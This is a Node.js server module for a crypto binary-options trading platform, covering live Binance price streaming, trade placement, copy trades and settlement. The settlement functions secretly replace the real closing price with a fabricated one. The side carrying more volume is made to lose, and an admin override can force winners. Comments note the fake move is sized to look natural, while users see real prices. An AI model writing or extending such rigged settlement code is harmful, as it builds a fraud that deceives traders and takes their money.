const jwt = require("jsonwebtoken");
const mongoose = require("mongoose");
const WebSocket = require('ws'); 
const AdminCopyTrade = require('./models/AdminCopyTrade');

// Global reference for marketData
let globalMarketData = {};

// 🚀 Store Live 24h Percentage from WebSocket
let last24hTickerData = {};

// --- Copy Trade Execution Logic ---
async function executeCopyTrade(io, User, Trade, copyTradeId) {
    const session = await mongoose.startSession();
    session.startTransaction();

    try {
        const copyTrade = await AdminCopyTrade.findById(copyTradeId)
            .populate('userCopies.userId')
            .session(session);

        if (!copyTrade || copyTrade.status !== 'active') {
            await session.abortTransaction();
            session.endSession();
            return;
        }

        copyTrade.status = 'executed';
        await copyTrade.save({ session });

        await session.commitTransaction();
        session.endSession();

    } catch (error) {
        await session.abortTransaction();
        session.endSession();
    }
}

// --- Auto-cleanup expired copy trades ---
async function cleanupExpiredCopyTrades(io, User, Trade) {
    try {
        const now = new Date();
        const expiredTrades = await AdminCopyTrade.find({
            status: 'active',
            executionTime: { $lte: now }
        }).lean();

        for (const copyTrade of expiredTrades) {
            try {
                await executeCopyTrade(io, User, Trade, copyTrade._id);
            } catch (innerErr) {}
        }
    } catch (error) {}
}

// =====================================================================
// ✅ NEW: Volume-based direction — Jo side pe zyada volume, wo LOSE kare
// =====================================================================
async function getManipulatedClosePrice(Trade, pair, entryPrice, userDirection) {
    try {
        // Sab active/pending trades fetch karo is pair ke liye
        const volumeData = await Trade.aggregate([
            {
                $match: {
                    asset: pair,
                    status: { $in: ["active", "pending", "scheduled"] }
                }
            },
            {
                $group: {
                    _id: '$direction',
                    totalVolume: { $sum: '$amount' },
                    count: { $sum: 1 }
                }
            }
        ]);

        let upVolume = 0;
        let downVolume = 0;

        volumeData.forEach(item => {
            if (item._id === 'UP') upVolume = item.totalVolume;
            if (item._id === 'DOWN') downVolume = item.totalVolume;
        });

        const totalVolume = upVolume + downVolume;

        // Koi volume nahi — real price use karo
        if (totalVolume === 0) return null;

        // Jo side pe zyada volume hai, wo LOSE kare
        // Matlab: agar UP pe zyada volume hai toh close < entry (candle red = UP loses)
        // Agar DOWN pe zyada volume hai toh close > entry (candle green = DOWN loses)
        const dominantSide = upVolume >= downVolume ? 'UP' : 'DOWN';

        const SMALL_MOVE = entryPrice * 0.0008; // 0.08% move — natural lagta hai

        if (dominantSide === 'UP') {
            // UP side zyada hai → unhe lose karwao → close < entry
            return entryPrice - SMALL_MOVE;
        } else {
            // DOWN side zyada hai → unhe lose karwao → close > entry
            return entryPrice + SMALL_MOVE;
        }

    } catch (error) {
        console.error('getManipulatedClosePrice error:', error);
        return null;
    }
}

// =====================================================================
// ✅ NEW: Force override ke sath — User ki specific direction WIN karwao
// =====================================================================
async function getManipulatedClosePriceForUser(Trade, pair, userId, entryPrice, userDirection, forceOverride) {
    try {
        // Admin ne force up/down lagaya hai
        if (forceOverride === 'up') {
            // Force UP: User ko win karwao agar wo UP pe hai
            // Jo UP pe hai → win (close > entry)
            // Jo DOWN pe hai → lose (close > entry)
            const MOVE = entryPrice * 0.0008;
            return entryPrice + MOVE; // candle green → UP wins, DOWN loses
        }

        if (forceOverride === 'down') {
            // Force DOWN: candle red → DOWN wins, UP loses
            const MOVE = entryPrice * 0.0008;
            return entryPrice - MOVE; // candle red → DOWN wins, UP loses
        }

        // No force — volume-based manipulation
        return await getManipulatedClosePrice(Trade, pair, entryPrice, userDirection);

    } catch (error) {
        return null;
    }
}

// --- WEBSOCKET TRADE MONITORING LOGIC ---
function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
    const lastProcessedCompletedCandleTs = {};
    const lastProcessedActivationTs = {};
    let lastCopyTradeCleanup = Date.now();

    const currentOffsets = {}; 
    const lastAggTimes = {};

    let indexModule = {};
    try {
        indexModule = require('./index');
    } catch (e) {
        console.warn("Could not load index.js for overrides.");
    }

    const streams = TRADE_PAIRS.map(p => `${p.toLowerCase()}@kline_1m/${p.toLowerCase()}@aggTrade/${p.toLowerCase()}@ticker`).join('/');
    const wsUrl = `wss://stream.binance.com:9443/stream?streams=${streams}`;
    
    let ws = new WebSocket(wsUrl);

    ws.on('open', () => {
        console.log('✅ Connected to Binance WebSockets (Price + Ticker)');
    });

    ws.on('message', async (message) => {
        try {
            const parsedRaw = JSON.parse(message);
            const parsed = parsedRaw.data ? parsedRaw.data : parsedRaw;

            if (!parsed) return;

            let overrides = {};
            try {
                overrides = indexModule.candleOverride || {};
            } catch (e) {}

            // -------------------------------------------------------
            // 1. LIVE TICKER DATA (24H Percentage)
            // -------------------------------------------------------
            if (parsed.e === '24hrTicker') {
                const pair = parsed.s;
                last24hTickerData[pair] = parseFloat(parsed.P);
            }

            // -------------------------------------------------------
            // 2. ULTRA-FAST TICK-BY-TICK PRICE (aggTrade)
            //    Sirf display ke liye — manipulation yahan nahi
            // -------------------------------------------------------
            else if (parsed.e === 'aggTrade') {
                const pair = parsed.s;
                const realPrice = parseFloat(parsed.p);
                const binanceTime = parsed.E;

                if (!globalMarketData[pair]) {
                    globalMarketData[pair] = { candles: [], currentCandle: null, lastEmit: 0 };
                }

                globalMarketData[pair].currentPrice = realPrice;

                const now = Date.now();
                if (now - (globalMarketData[pair].lastEmit || 0) > 250) {
                    io.emit('price_update', { pair, price: realPrice, timestamp: binanceTime });
                    
                    const formattedPair = pair.replace('USDT', '/USDT');
                    io.emit('dashboard_price_update', {
                        [formattedPair]: {
                            price: realPrice,
                            change: last24hTickerData[pair] || 0
                        }
                    });

                    globalMarketData[pair].lastEmit = now;
                }
            }

            // -------------------------------------------------------
            // 3. CANDLESTICK DATA & SETTLEMENT
            // -------------------------------------------------------
            else if (parsed.e === 'kline') {
                const pair = parsed.s; 
                const k = parsed.k;

                // Real prices — no offset on display
                const openPrice  = parseFloat(k.o);
                const closePrice = parseFloat(k.c);
                const highPrice  = parseFloat(k.h);
                const lowPrice   = parseFloat(k.l);

                const candleObj = {
                    timestamp: new Date(k.t),
                    open:  openPrice,
                    high:  highPrice,
                    low:   lowPrice,
                    close: closePrice,
                    isClosed: k.x
                };

                if (!globalMarketData[pair]) globalMarketData[pair] = { candles: [], currentCandle: null };
                globalMarketData[pair].currentCandle = candleObj;

                // Activation logic — candle shuru hote hi trades activate karo
                const activationTs = candleObj.timestamp.getTime();
                if (!lastProcessedActivationTs[pair] || lastProcessedActivationTs[pair] < activationTs) {
                    await activateScheduledTradesForPair(io, Trade, pair, candleObj.timestamp, openPrice);
                    await activatePendingTradesForPair(io, User, Trade, pair, candleObj.timestamp, openPrice);
                    lastProcessedActivationTs[pair] = activationTs;
                }

                // Candle close hone par settlement
                if (k.x) { 
                    if (!globalMarketData[pair].candles) globalMarketData[pair].candles = [];
                    globalMarketData[pair].candles.push(candleObj);
                    
                    if (globalMarketData[pair].candles.length > 50) {
                        globalMarketData[pair].candles.shift();
                    }

                    const lastCompletedTs = candleObj.timestamp.getTime();
                    if (!lastProcessedCompletedCandleTs[pair] || lastProcessedCompletedCandleTs[pair] < lastCompletedTs) {

                        // ✅ Override fetch karo settlement se PEHLE
                        let currentOverride = null;
                        try {
                            currentOverride = (indexModule.candleOverride && indexModule.candleOverride[pair]) || null;
                        } catch(e) {}

                        await settleActiveTradesForPair(io, User, Trade, pair, candleObj, currentOverride);
                        lastProcessedCompletedCandleTs[pair] = lastCompletedTs;

                        // Override clear karo use ke baad
                        try {
                            if (indexModule.candleOverride && indexModule.candleOverride[pair]) {
                                indexModule.candleOverride[pair] = null;
                            }
                        } catch(e) {}
                    }
                }

                const now = Date.now();
                if ((now - lastCopyTradeCleanup) > 5000) {
                    await cleanupExpiredCopyTrades(io, User, Trade);
                    lastCopyTradeCleanup = now;
                }
            }
        } catch (error) {
            console.error('WebSocket message processing error:', error);
        }
    });

    ws.on('close', () => {
        console.log('⚠️ Binance WebSocket Disconnected. Reconnecting in 3 seconds...');
        setTimeout(() => runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS), 3000);
    });

    ws.on('error', (err) => {
        console.error('Binance WebSocket Error:', err.message);
    });
}

async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
    globalMarketData = marketData;
    io.engine.marketData = marketData;

    io.use((socket, next) => {
        try {
            let token = socket.handshake.auth?.token;
            
            if (!token) {
                const authHeader = socket.handshake.headers.authorization;
                if (authHeader && authHeader.startsWith('Bearer ')) {
                    token = authHeader.substring(7);
                }
            }
            
            if (!token) return next(new Error("Authentication error: No token"));
            
            jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
                if (err) return next(new Error("Authentication error: Invalid token"));
                socket.decoded = decoded;
                next();
            });
        } catch (err) {
            return next(new Error("Authentication error"));
        }
    });

    runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS);

    io.on("connection", async (socket) => {
        try {
            const userId = socket.decoded.id;
            const user = await User.findById(userId);
            if (!user) return socket.disconnect();
            socket.join(user._id.toString());

            const userTrades = await Trade.find({ userId: user._id }).sort({ timestamp: -1 }).limit(50);
            
            socket.emit("init", { 
                balance: user.balance, 
                tradeHistory: userTrades,
                marketData: globalMarketData
            });

            // DASHBOARD DATA HANDLER
            socket.on('request_dashboard_data', async () => {
                try {
                    const freshUser = await User.findById(userId);
                    if (!freshUser) return;

                    const today = new Date();
                    today.setHours(0, 0, 0, 0);
                    const tomorrow = new Date(today);
                    tomorrow.setDate(tomorrow.getDate() + 1);

                    const todayTrades = await Trade.find({ 
                        userId: freshUser._id, 
                        status: "closed", 
                        closeTime: { $gte: today, $lt: tomorrow } 
                    });

                    const todayPnl = todayTrades.reduce((sum, t) => sum + (t.pnl || 0), 0);

                    const assetsInfo = [
                        { ticker: 'BTC/USDT', name: 'Bitcoin' },
                        { ticker: 'ETH/USDT', name: 'Ethereum' },
                        { ticker: 'BNB/USDT', name: 'Binance Coin' },
                        { ticker: 'SOL/USDT', name: 'Solana' },
                        { ticker: 'XRP/USDT', name: 'Ripple' },
                        { ticker: 'ADA/USDT', name: 'Cardano' },
                        { ticker: 'DOGE/USDT', name: 'Dogecoin' },
                        { ticker: 'AVAX/USDT', name: 'Avalanche' },
                        { ticker: 'LINK/USDT', name: 'Chainlink' },
                        { ticker: 'MATIC/USDT', name: 'Polygon' }
                    ];

                    const assets = assetsInfo.map(info => {
                        const rawPair = info.ticker.replace('/', '');
                        return {
                            ticker: info.ticker,
                            name: info.name,
                            price: globalMarketData[rawPair]?.currentPrice || 0,
                            change: last24hTickerData[rawPair] || 0
                        };
                    });

                    socket.emit('dashboard_data', {
                        success: true,
                        data: {
                            username: freshUser.username,
                            balance: freshUser.balance,
                            todayPnl: todayPnl,
                            assets: assets
                        }
                    });
                } catch (error) {
                    console.error("Dashboard Data Error:", error);
                }
            });

            socket.on("trade", async (data) => {
                try {
                    const { asset, direction, amount } = data;
                    if (!TRADE_PAIRS.includes(asset)) return socket.emit("error", { message: "Invalid asset." });
                    if (!["UP", "DOWN"].includes(direction)) return socket.emit("error", { message: "Invalid direction." });

                    const existingTrade = await Trade.findOne({ 
                        userId: user._id, 
                        status: { $in: ["pending", "active", "scheduled"] } 
                    });

                    if (existingTrade) {
                        return socket.emit("error", { 
                            message: `You already have an active trade. Please wait for it to complete.` 
                        });
                    }

                    const tradeAmount = parseFloat(amount);
                    if (isNaN(tradeAmount) || tradeAmount <= 0) {
                        return socket.emit("error", { message: "Invalid trade amount." });
                    }

                    const freshUser = await User.findById(user._id);

                    if (freshUser.balance < tradeAmount) {
                        return socket.emit("error", { 
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
                        });
                    }

                    // ✅ Direction manipulation hataya — ab settlement pe hoga
                    freshUser.balance -= tradeAmount;
                    await freshUser.save();

                    const trade = new Trade({
                        userId: user._id,
                        amount: tradeAmount,
                        direction: direction, // ✅ User ki original direction save karo
                        asset,
                        status: "pending", 
                        timestamp: new Date()
                    });
                    await trade.save();

                    io.to(user._id.toString()).emit("trade_pending", { trade, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not place trade." });
                }
            });

            socket.on("copy_trade", async (data) => {
                const session = await mongoose.startSession();
                session.startTransaction();

                try {
                    const { copyTradeId } = data;

                    const freshUser = await User.findById(userId).session(session);
                    if (!freshUser || freshUser.balance < 100) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "Minimum $100 balance required to copy trades" });
                    }

                    const existingTrade = await Trade.findOne({ 
                        userId: user._id, 
                        status: { $in: ["pending", "active", "scheduled"] } 
                    }).session(session);

                    if (existingTrade) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { 
                            message: `You already have an active trade. Please wait for it to complete before copying.` 
                        });
                    }

                    const copyTrade = await AdminCopyTrade.findById(copyTradeId).session(session);
                    if (!copyTrade || copyTrade.status !== 'active' || copyTrade.executionTime <= new Date()) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "This copy trade is no longer available" });
                    }

                    const alreadyCopied = copyTrade.userCopies.find(copy => copy.userId.toString() === userId);
                    if (alreadyCopied) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { message: "You have already copied this trade" });
                    }

                    const tradeAmount = (freshUser.balance * copyTrade.percentage) / 100;

                    if (freshUser.balance < tradeAmount) {
                        await session.abortTransaction();
                        session.endSession();
                        return socket.emit("error", { 
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}` 
                        });
                    }

                    const executionTime = new Date(copyTrade.executionTime);
                    executionTime.setSeconds(0, 0); 

                    const scheduledTrade = new Trade({
                        userId: user._id,
                        amount: tradeAmount,
                        direction: copyTrade.direction === 'CALL' ? 'UP' : 'DOWN',
                        asset: copyTrade.tradingPair,
                        status: "scheduled",
                        scheduledTime: executionTime, 
                        timestamp: new Date(),
                        isCopyTrade: true,
                        originalCopyTradeId: copyTrade._id
                    });

                    freshUser.balance -= tradeAmount;

                    copyTrade.userCopies.push({
                        userId: userId,
                        copiedAt: new Date(),
                        tradeAmount: tradeAmount
                    });

                    await scheduledTrade.save({ session });
                    await copyTrade.save({ session });
                    await freshUser.save({ session });

                    await session.commitTransaction();
                    session.endSession();

                    const now = new Date();
                    const timeUntilExecution = executionTime - now;
                    const minutesUntilExecution = Math.floor(timeUntilExecution / (1000 * 60));

                    socket.emit("copy_trade_success", {
                        message: `Successfully copied trade! $${tradeAmount.toFixed(2)} scheduled to execute in ${minutesUntilExecution} minutes.`,
                        copyTrade: {
                            tradingPair: copyTrade.tradingPair,
                            direction: copyTrade.direction,
                            percentage: copyTrade.percentage,
                            executionTime: executionTime,
                            tradeAmount: tradeAmount,
                            minutesUntilExecution: minutesUntilExecution
                        },
                        scheduledTrade: scheduledTrade
                    });

                    io.to(user._id.toString()).emit("trade_scheduled", { 
                        trade: scheduledTrade, 
                        balance: freshUser.balance 
                    });

                } catch (error) {
                    await session.abortTransaction();
                    session.endSession();
                    socket.emit("error", { message: "Failed to copy trade" });
                }
            });

            socket.on("cancel_trade", async (data) => {
                try {
                    const trade = await Trade.findOne({
                        _id: data.tradeId,
                        userId: user._id,
                        status: { $in: ["pending", "scheduled"] }
                    });
                    if (!trade) return socket.emit("error", { message: "Trade not found or cannot be cancelled." });

                    const freshUser = await User.findById(user._id);
                    freshUser.balance += trade.amount;
                    await freshUser.save();

                    trade.status = "cancelled";
                    await trade.save();
                    io.to(user._id.toString()).emit("trade_cancelled", { tradeId: trade._id, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not cancel trade." });
                }
            });

            socket.on("disconnect", () => { });
        } catch (err) {
            socket.disconnect();
        }
    });
}

// --- Helper Functions ---
async function activateScheduledTradesForPair(io, Trade, pair, candleTimestamp, entryPrice) {
    try {
        const candleTime = new Date(candleTimestamp);
        candleTime.setSeconds(0, 0);

        const scheduleds = await Trade.find({ 
            status: "scheduled", 
            asset: pair, 
            scheduledTime: { $lte: candleTime } 
        });

        for (const t of scheduleds) {
            t.status = "active";
            t.entryPrice = entryPrice;
            t.activationTimestamp = candleTime; 
            await t.save();
            io.to(t.userId.toString()).emit("trade_active", { trade: t });
        }
    } catch (err) {}
}

async function activatePendingTradesForPair(io, User, Trade, pair, candleTimestamp, entryPrice) {
    try {
        const pendings = await Trade.find({ status: "pending", asset: pair });
        for (const t of pendings) {
            t.status = "active";
            t.entryPrice = entryPrice;
            t.activationTimestamp = candleTimestamp; 
            await t.save();
            io.to(t.userId.toString()).emit("trade_active", { trade: t });
        }
    } catch (err) {}
}

// =====================================================================
// ✅ MAIN FIX: settleActiveTradesForPair — Override + Volume logic
// =====================================================================
async function settleActiveTradesForPair(io, User, Trade, pair, lastCompletedCandle, forceOverride) {
    const realExitPrice = lastCompletedCandle.close;
    const completedCandleStartTime = new Date(lastCompletedCandle.timestamp).getTime();
    const settlementEligibilityTime = completedCandleStartTime + (60 * 1000);

    try {
        const actives = await Trade.find({ status: "active", asset: pair });
        if (actives.length === 0) return;

        // -------------------------------------------------------
        // ✅ Step 1: Volume calculate karo — kaun zyada hai UP ya DOWN
        // -------------------------------------------------------
        let upVolume = 0;
        let downVolume = 0;

        actives.forEach(t => {
            const tradeActivationTime = new Date(t.activationTimestamp).getTime();
            const tradeShouldCloseBy = tradeActivationTime + (60 * 1000);
            if (tradeShouldCloseBy <= settlementEligibilityTime) {
                if (t.direction === 'UP') upVolume += t.amount;
                else downVolume += t.amount;
            }
        });

        // -------------------------------------------------------
        // ✅ Step 2: Decide karo final exit price kya hoga
        //    - Force override → us direction ko WIN karwao
        //    - No override → dominant side ko LOSE karwao
        // -------------------------------------------------------
        let manipulatedExitPrice = realExitPrice;
        const entryPriceSample = actives[0]?.entryPrice || realExitPrice;
        const MOVE = entryPriceSample * 0.0008; // 0.08% move — natural lagta hai

        if (forceOverride === 'up') {
            // Admin ne force UP lagaya — UP wale WIN karein
            // close > entry = green candle = UP wins
            manipulatedExitPrice = entryPriceSample + MOVE;
            console.log(`[${pair}] Force UP override → exit price set to ${manipulatedExitPrice.toFixed(5)}`);

        } else if (forceOverride === 'down') {
            // Admin ne force DOWN lagaya — DOWN wale WIN karein
            // close < entry = red candle = DOWN wins
            manipulatedExitPrice = entryPriceSample - MOVE;
            console.log(`[${pair}] Force DOWN override → exit price set to ${manipulatedExitPrice.toFixed(5)}`);

        } else if (upVolume > 0 || downVolume > 0) {
            // No force — Volume-based: dominant side LOSE kare
            if (upVolume > downVolume) {
                // UP pe zyada volume → UP ko LOSE karwao → close < entry
                manipulatedExitPrice = entryPriceSample - MOVE;
                console.log(`[${pair}] Volume manipulation → UP dominant (${upVolume.toFixed(2)} vs ${downVolume.toFixed(2)}) → exit set LOW`);
            } else if (downVolume > upVolume) {
                // DOWN pe zyada volume → DOWN ko LOSE karwao → close > entry
                manipulatedExitPrice = entryPriceSample + MOVE;
                console.log(`[${pair}] Volume manipulation → DOWN dominant (${downVolume.toFixed(2)} vs ${upVolume.toFixed(2)}) → exit set HIGH`);
            } else {
                // Equal volume — real price use karo
                manipulatedExitPrice = realExitPrice;
                console.log(`[${pair}] Equal volume — using real exit price`);
            }
        }

        // -------------------------------------------------------
        // ✅ Step 3: Sab trades settle karo manipulated price pe
        // -------------------------------------------------------
        for (const t of actives) {
            const tradeActivationTime = new Date(t.activationTimestamp).getTime();
            const tradeShouldCloseBy = tradeActivationTime + (60 * 1000);

            if (tradeShouldCloseBy <= settlementEligibilityTime) {

                const exitPrice = manipulatedExitPrice;
                const entryPrice = t.entryPrice;

                const win = (t.direction === "UP" && exitPrice > entryPrice) ||
                            (t.direction === "DOWN" && exitPrice < entryPrice);
                const tie = Math.abs(exitPrice - entryPrice) < 0.000001;

                const pnl = tie ? 0 : (win ? t.amount * 0.9 : -t.amount);

                t.status = "closed";
                t.exitPrice = exitPrice;
                t.result = tie ? "TIE" : (win ? "WIN" : "LOSS");
                t.pnl = pnl;
                t.closeTime = new Date();
                await t.save();

                const userAfter = await User.findByIdAndUpdate(
                    t.userId,
                    {
                        $inc: {
                            balance: t.amount + pnl,
                            totalTradeVolume: t.amount
                        }
                    },
                    { new: true }
                );

                // Today's P&L calculate karo
                const today = new Date();
                today.setHours(0, 0, 0, 0);
                const tomorrow = new Date(today);
                tomorrow.setDate(tomorrow.getDate() + 1);

                const todayTrades = await Trade.find({
                    userId: t.userId,
                    status: "closed",
                    closeTime: { $gte: today, $lt: tomorrow }
                });

                const todayPnl = todayTrades.reduce((sum, trade) => sum + (trade.pnl || 0), 0);

                io.to(t.userId.toString()).emit("trade_result", { 
                    trade: t, 
                    balance: userAfter.balance,
                    todayPnl: parseFloat(todayPnl.toFixed(2))
                });

                console.log(`[${pair}] Trade settled: ${t.direction} | entry=${entryPrice?.toFixed(5)} | exit=${exitPrice.toFixed(5)} | result=${t.result} | pnl=${pnl.toFixed(2)}`);
            }
        }
    } catch (err) {
        console.error('settleActiveTradesForPair error:', err);
    }
}

module.exports = { initialize };
